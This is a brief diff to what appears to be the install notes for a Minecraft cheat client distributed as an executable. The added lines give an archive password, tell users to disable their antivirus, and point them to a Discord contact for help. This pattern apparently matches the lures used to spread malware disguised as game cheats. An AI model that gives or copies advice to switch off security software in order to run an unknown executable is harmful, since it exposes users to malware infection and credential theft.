@@ -1,2 +1,5 @@
-After installation, run Tox1c Client.exe
-Password:Tox1cClient
+After installation, run Tox1c Client.exe and start normal minecraft
+PASSWORD:Tox1cClient
+Disable antivirus programs for the cheat to work properly 
+If the cheat doesn't work, download C++
+if the cheat also does not start, write to me in discord:furilav
